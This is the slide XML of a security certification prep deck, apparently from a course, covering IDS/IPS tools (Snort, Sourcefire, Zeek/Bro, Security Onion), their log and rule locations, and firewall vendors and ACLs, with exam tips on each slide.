<file path=ppt/slides/slide3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PREVENTIVE TOOLS: PART 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Sourcefire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Sourcefire was a network security company, founded by the creator of the open-source Snort IDS/IPS engine, that Cisco acquired in 2013.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Its technology became the foundation of Cisco's Firepower (now Secure Firewall) next-generation IPS and firewall products, and Snort remains a widely used open-source intrusion detection and prevention engine driven by community and commercial rule sets.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Snort-style rules let analysts define signatures that match malicious packet patterns and trigger alerts or blocks.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Analysts care because Snort and its rule syntax are a de facto standard for signature-based network detection, and understanding its lineage helps in configuring and interpreting many commercial IDS/IPS platforms.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Sourcefire may appear as background for Snort-based IDS/IPS detection, so know that Snort is the open-source engine (now under Cisco) behind signature-based network intrusion detection.</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335</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide3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PREVENTIVE TOOLS: PART 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Sourcefire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5486400" cy="4480560"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  https://www.cisco.com/c/en/us/services/acquisitions/sourcefire.html</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="8" name="Picture 7" descr="img_3d7fb79d14.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6492240" y="2836973"/>
            <a:ext cx="4937760" cy="2189893"/>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336</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide3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PREVENTIVE TOOLS: PART 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IDS/IPS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An Intrusion Detection System (IDS) passively inspects network or host activity and raises alerts when it recognizes malicious or policy-violating traffic, while an Intrusion Prevention System (IPS) sits inline and can actively drop or block that traffic in real time.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Detection can be signature-based (matching known attack patterns) or anomaly/behavior-based (flagging deviations from a baseline); Snort began as the open-source engine behind the commercial Sourcefire product later acquired by Cisco, Zeek (formerly Bro) is an open-source network analysis framework that produces rich protocol logs, and Security Onion is a free Linux distribution that bundles Zeek, Snort/Suricata, and other tools to give a comprehensive view of traffic.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A SOC analyst relies on IDS/IPS as a primary source of network telemetry and detections, tuning rules to reduce false positives and correlating alerts with other sources to confirm and scope incidents.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Expect scenario questions asking you to distinguish detection from prevention and to identify which tool (Snort, Zeek/Bro, Security Onion) fits a given monitoring need.</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337</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide3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PREVENTIVE TOOLS: PART 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IDS/IPS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Sourcefire</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Began as commercial product called Snort</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Eventually acquired by Cisco</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Bro</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Open source</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Network analysis framework</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Snort</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Security Onion</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Open source Linux distro</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Uses Bro &amp; Snort to give comprehensive view of traffic</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  http://chrissanders.org/SO-CheatSheet.pdf</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338</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide3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PREVENTIVE TOOLS: PART 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Bro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Bro, now renamed Zeek, is an open-source network security monitoring framework that passively observes traffic and generates detailed, structured logs of activity rather than simple pass/fail alerts.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  In a Security Onion deployment its logs are written to /nsm/bro/logs, consumed by syslog-ng, and indexed into a searchable store such as ELSA, producing files like conn.log for TCP/UDP/ICMP connections, dns.log for DNS queries and responses, and ftp.log for FTP transfers.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Analysts value Zeek because its connection and protocol logs give the who-talked-to-whom context needed for threat hunting, incident scoping, and building a network baseline, even when no signature fired.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: The exam may present a log excerpt (conn.log, dns.log) and ask what network activity it reveals or which tool produced it.</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339</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide3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PREVENTIVE TOOLS: PART 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Bro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https://www.bro.org</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Bro logs are stored in /nsm/bro/logs</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  They are consumed by syslog-ng and stored in ELSA</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340</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide3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PREVENTIVE TOOLS: PART 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Bro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Bro monitors your network traffic and creates logs, such as:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  conn.log</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  TCP/UDP/ICMP connections</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  dns.log</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  DNS activity</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  ftp.log</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  FTP activity</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  http.log</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  HTTP requests and replies</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  SSL/TLS handshake info</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341</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide3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PREVENTIVE TOOLS: PART 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Snort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Snort is a widely used open-source, signature-based IDS/IPS that inspects packets against a ruleset and alerts or blocks when traffic matches a known malicious pattern; the commercial Sourcefire product was built on it.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Its rules live under /etc/nsm/rules, with analyst-authored custom rules placed in /etc/nsm/rules/local.rules, and unlike Zeek it does not log everything by default, so you must explicitly enable the rules for the activity you want to detect.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A SOC analyst writes and tunes Snort rules to catch specific exploits or indicators, balancing coverage against false positives and performance.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Look for items on where Snort rules are stored, how to write a local rule, and how Snort's signature approach differs from Zeek's logging.</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342</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide3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PREVENTIVE TOOLS: PART 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Snort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Sourcefire was based off Snort</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  https://www.snort.org</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Rules located in: /etc/nsm/rules</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Local rules stored in: /etc/nsm/rules/local.rules</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Snort doesn’t record everything, like Bro, so enable what you want to see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343</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide3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PREVENTIVE TOOLS: PART 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Firewalls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A firewall is a hardware or software control that inspects traffic crossing a network boundary and permits or blocks it based on a defined set of rules, typically expressed as an access control list (ACL) that matches on source/destination IP, port, and protocol.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  By enforcing these rules the firewall implements the organization's security policy at network segments, and common enterprise and open-source options include Cisco, Palo Alto, Check Point, Linux ufw, and pfSense.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Analysts review firewall rules and logs to verify segmentation, spot misconfigurations or overly permissive rules, and use allow/deny data as evidence when investigating suspicious connections.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Expect questions on rule/ACL ordering, default deny, and choosing an appropriate firewall type for a given segmentation or access requirement.</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344</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide3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PREVENTIVE TOOLS: PART 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Firewalls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Hardware or software</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Stops based on set of rules</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Rules are part of ACL</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Enforce company security policy</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Cisco</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Palo Alto</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Check Point</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  ufw</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  pfsense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345</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide3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PREVENTIVE TOOLS: PART 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Cisco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Cisco is a well-established, robust vendor that has grown its security portfolio by acquiring many startups, including Sourcefire, whose Snort technology now powers its threat detection.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Its Next-Generation Firewalls (NGFWs) are a popular class of smart firewalls that add application awareness, integrated IPS, and threat intelligence on top of traditional packet filtering, and its firewall line is subdivided by purpose and business size, scaling from small and medium businesses up to service providers and data centers.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Analysts encounter Cisco firewalls widely in enterprise environments, so understanding their NGFW capabilities and sizing helps in tuning policy and interpreting their logs.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: The exam frames Cisco as an NGFW example and may ask which firewall tier or feature set suits a stated organizational size or need.</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346</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide3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PREVENTIVE TOOLS: PART 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Cisco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Well-known, robust</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Acquired many startups</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Robust &amp; powerful</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Including Sourcefire</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Next Generation Firewall (NGFW)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Popular term for smart firewalls</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
